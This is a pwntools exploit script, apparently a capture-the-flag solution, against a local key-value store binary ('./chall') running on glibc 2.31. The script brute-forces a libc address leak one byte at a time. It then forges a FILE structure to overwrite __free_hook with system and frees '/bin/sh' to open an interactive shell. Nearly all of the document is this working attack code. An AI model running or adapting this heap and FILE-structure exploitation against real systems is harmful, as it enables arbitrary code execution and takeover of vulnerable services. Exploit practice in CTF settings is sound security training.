from pwn import *

if args.REMOTE:
    p = remote('localhost', 7777)
else:
    p = process('./chall')
e = ELF('./chall')
libc = ELF('./libc-2.31.so')

def add(key, value):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Key: ', key)
    p.sendlineafter(b'Value: ', value)

def get(key):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Key: ', key)

def _del(key):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Key: ', key)

def save():
    p.sendlineafter(b'> ', b'4')

def fclose():
    p.sendlineafter(b'> ', b'5')
    p.sendline(b'N')

add(b'A'*0x400, b'0')
_del(b'A'*0x400)
add(b'A'*0x78, b'0')

leak = b''
for i in range(6):
    for c in range(256):
        if c == 0xa:
            continue
        payload = b'A'*0x78 + p64(0)
        payload += leak + bytes([c])
        get(payload)
        if not b"Item not found" in p.recvline():
            leak += bytes([c])
            # print(leak)
            break
libc.address = u64(leak.ljust(8, b'\0')) - 0x1ecbe0
log.info(hex(libc.address))

win = libc.symbols['system']
# Fill tcache for 0x1e0
for i in range(7):
    add(p64(win)*0x1e0, b'0')
    fclose()
    add(p64(win)*0x1e0, b'0')
    save()
add(p64(win)*0x1e0, b'0')
fclose()

file = [
    0, 0,
    0, 0,
    0, 0,
    0, libc.symbols['__free_hook']-0xda,    # _IO_buf_base
    libc.symbols['__free_hook']+6, 0,       # _IO_buf_end
    0, 0,
    0, libc.symbols['_IO_2_1_stderr_'],
    0, 0,
    0, libc.bss()+0x500,
]
payload = b''
for i in file:
    payload += p64(i)

# Overwrite FILE struct
add(payload, b'1')
# Overwrite __free_hook
save()

_del(b'/bin/sh\0')
p.interactive()
